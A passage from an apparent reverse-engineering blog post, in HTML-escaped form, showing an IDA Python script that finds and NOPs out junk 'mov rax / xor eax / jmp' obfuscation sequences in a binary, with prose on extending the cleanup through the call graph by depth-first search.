class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hex_bytes = &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(hex_bytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address, &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(hex_bytes), mnemonic, operand_part&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;is_messed_instruction&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;call_loc&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    instructions of the type:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov     rax, 48FFFF08EB0B6754h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    xor eax, eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; reg_map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cur_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    insn_len = ida_ua.decode_insn(cur_insn, call_loc)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; insn_len != &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# check if it&amp;#x27;s a mov to rax with a large immediate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; cur_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;mov&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[cur_insn.Op1.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        hex_value = &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(cur_insn.Op2.value)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(hex_value)) != &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; (KeyError, ValueError):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# check the second instruction (xor eax, eax)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    next_insn_len = ida_ua.decode_insn(next_insn, call_loc+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; next_insn_len != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; next_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;xor&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[next_insn.Op1.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; reg_map[next_insn.Op2.reg] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;rax&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; KeyError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# now we know for sure it is a messed instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# calculate the jump address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_insn_len = ida_ua.decode_insn(jmp_insn, call_loc+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; jmp_insn_len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; jmp_insn.get_canon_mnem() != &lt;span class=&#34;string&#34;&gt;&amp;#x27;jmp&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# jmp address - return as an integer, not a hex string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    jmp_addr = jmp_insn.Op1.addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;jmp_addr = &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, jmp_addr, jmp_addr - call_loc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# initialize register map&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg_map = get_register_map()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; reg_map:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        reg_map[i] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt; + reg_map[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_start = &lt;span class=&#34;number&#34;&gt;0x407EB0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curr_addr = main_start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;end_addr = &lt;span class=&#34;number&#34;&gt;0x40AA40&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; curr_addr &amp;lt; end_addr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = is_messed_instruction(curr_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        is_messed, jmp_addr, length = result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Found messed instruction at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(curr_addr)&amp;#125;&lt;/span&gt;, jumping to &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# NOP out the bogus instruction &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            idc.patch_byte(curr_addr + i, &lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# skip the next 5 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        curr_addr += &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# force create an instruction at the jump address in idb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        idc.create_insn(jmp_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# decode the instruction at the jump address so we can get the new jump address (chain basically)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        jmp_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        jmp_insn_len = ida_ua.decode_insn(jmp_insn, jmp_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; jmp_insn_len &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; jmp_insn.get_canon_mnem() == &lt;span class=&#34;string&#34;&gt;&amp;#x27;jmp&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            jmp_chain_addr = jmp_insn.Op1.addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;jmp_chain_addr = &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_chain_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# NOP out the bogus instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            range_len = jmp_chain_addr - jmp_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(range_len):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                idc.patch_byte(jmp_addr + i, &lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;No valid jump instruction at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;No messed instruction found at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(curr_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Soon after this, I wanted to fix up the entire binary - whichever functions were being called that is. So I went with a DFS approach.&lt;br /&gt;
From main, make a list of all the functions being called from inside it. Subsequently, add those to the &amp;quot;deobfuscation&amp;quot; queue. Likewise, keep going until there are no functions left.&lt;/p&gt;
&lt;p&gt;Also one annoying thing is inside IDA&#39;s API, all the instructions and registers are stored using codes instead of their actual names. I found that the method I&#39;ve used in my script works for most cases.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span 